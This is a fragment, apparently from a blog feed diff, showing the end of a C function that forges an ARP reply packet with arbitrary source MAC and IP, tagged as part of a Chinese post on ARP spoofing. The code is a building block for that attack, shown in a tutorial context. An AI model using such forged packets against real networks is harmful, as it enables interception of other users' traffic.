dest_mac,</span></span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">arp_packet</span> <span class="title">packet</span>;</span></div><div class="line">	<span class="built_in">memcpy</span>(packet.eth.dest_mac, dest_mac, <span class="number">6</span>);</div><div class="line">	<span class="built_in">memcpy</span>(packet.eth.source_mac, source_mac, <span class="number">6</span>);</div><div class="line">	packet.eth.eh_type = htons(<span class="number">0x0806</span>);</div><div class="line"></div><div class="line">	packet.arp.hardware_type = htons(<span class="number">0x0001</span>);</div><div class="line">	packet.arp.protocol_type = htons(<span class="number">0x0800</span>);</div><div class="line">	packet.arp.add_len = <span class="number">0x06</span>;</div><div class="line">	packet.arp.pro_len = <span class="number">0x04</span>;</div><div class="line">	</div><div class="line">	packet.arp.option = htons(<span class="number">0x0002</span>);</div><div class="line">	<span class="built_in">memcpy</span>(packet.arp.sour_addr, source_mac, <span class="number">6</span>);</div><div class="line">	packet.arp.sour_ip = src_ip;</div><div class="line">	<span class="built_in">memcpy</span>(packet.arp.dest_addr, dest_mac, <span class="number">6</span>);</div><div class="line">	packet.arp.dest_ip = dest_ip;</div><div class="line">	<span class="built_in">memset</span>(packet.arp.padding, <span class="number">0</span>, <span class="number">18</span>);</div><div class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;packet;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;
-&lt;p&gt;好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&quot;ARP-协议是什么&quot;&gt;&lt;a href=&quot;#ARP-协议是什么&quot; class=&quot;headerlink&quot; title=&quot;ARP 协议是
-    
-    </summary>
-    
-    
-      <category term="ARP欺骗" scheme="http://www.evilclay.com/tags/ARP%E6%AC%BA%E9%AA%97/"/>
     
   </entry>
   
